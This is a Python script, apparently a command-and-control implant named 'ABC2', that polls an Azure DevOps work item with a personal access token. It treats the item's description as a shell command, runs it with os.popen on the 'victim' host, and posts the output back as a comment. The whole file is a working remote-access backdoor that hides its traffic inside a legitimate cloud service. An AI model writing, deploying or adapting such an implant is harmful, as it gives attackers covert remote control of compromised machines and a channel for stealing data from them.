import os
import time
import requests
import re
import uuid
import argparse
from argparse import RawTextHelpFormatter

API_VERSION = "api-version=7.1-preview.3"
CLEANTAGSR = re.compile('<.*?>')

name = "victim_" + str(uuid.uuid4())
timestamp = None

def cleanhtml(raw_html):
    cleantext = re.sub(CLEANTAGSR, '', raw_html)
    return cleantext

def initialize(token: str, organization: str, project: str, num_id: str, type: str) -> None:
    global timestamp
    base_url = f"https://dev.azure.com/{organization}/{project}/_apis/wit/workitems/"
    create_url = f"{base_url}${type}?{API_VERSION}"
    try:
        r = requests.get(f"{base_url}{num_id}?{API_VERSION}", 
                         auth=('', token))
        if r.status_code == 200:
            output = r.json()
            timestamp = output['fields']['System.ChangedDate']
        else:
            d = '[{"op": "add", "path": "/fields/System.Title", "from": null, "value": "' + name + '"}]'
            r = requests.post(create_url, 
                        auth=('', token), 
                        headers={"Content-Type": "application/json-patch+json"}, 
                        data=d)
            output = r.json()
            timestamp = output['fields']['System.ChangedDate']
    except Exception as e:
        print(e)
        exit(0)
    main_loop(base_url, num_id, token)

def main_loop(base_url: str, num_id: str, token: str) -> None:
    global timestamp
    while True:
        time.sleep(10)
        r = requests.get(f"{base_url}{num_id}?{API_VERSION}", auth=('', token))
        output = r.json()
        command = cleanhtml(output['fields']['System.Description'])
        if output['fields']['System.ChangedDate'] > timestamp:
            # We can either use post and add comment or update description of work item using patch
            stream = os.popen(command)
            c_out = stream.read()
            d = '{"text": "' + command + ': ' + c_out + '"}'
            r = requests.post(f"{base_url}{num_id}/comments?{API_VERSION}", 
                              auth=('', token), 
                              headers={"Content-Type": "application/json"}, 
                              data=d)
            r = requests.get(f"{base_url}{num_id}?{API_VERSION}", 
                             auth=('', token))
            output = r.json()
            timestamp = output['fields']['System.ChangedDate']

def main():
    parser = argparse.ArgumentParser(description = 
"    _     ____    ____  ____  \n" +
"   / \   | __ )  / ___||___ \ \n" +
"  / _ \  |  _ \ | |      __) |\n" +
" / ___ \ | |_) || |___  / __/ \n" +
"/_/   \_\|____/  \____||_____|\n", formatter_class=RawTextHelpFormatter)

    parser.add_argument("-t", "--token", type = str,
                        metavar = "token", required=True,
                        help = "Azure Personal Access Token")
    parser.add_argument("-o", "--org", type = str, 
                        metavar = "organization", required=True, 
                        help = "Azure organization")
    parser.add_argument("-p", "--project", type=str,
                        metavar = "project", required=True,
                        help = "Azure project")
    parser.add_argument("-i", "--id", type=str,
                        metavar="id", required=True,
                        default="1", help = "ID of azure item")
    parser.add_argument("-T", "--type", type=str,
                        metavar = "type", default = "Task",
                        help = "Type of azure item")
    
    args = parser.parse_args()

    initialize(args.token, args.org, args.project, args.id, args.type)

if __name__ == '__main__':
    main()
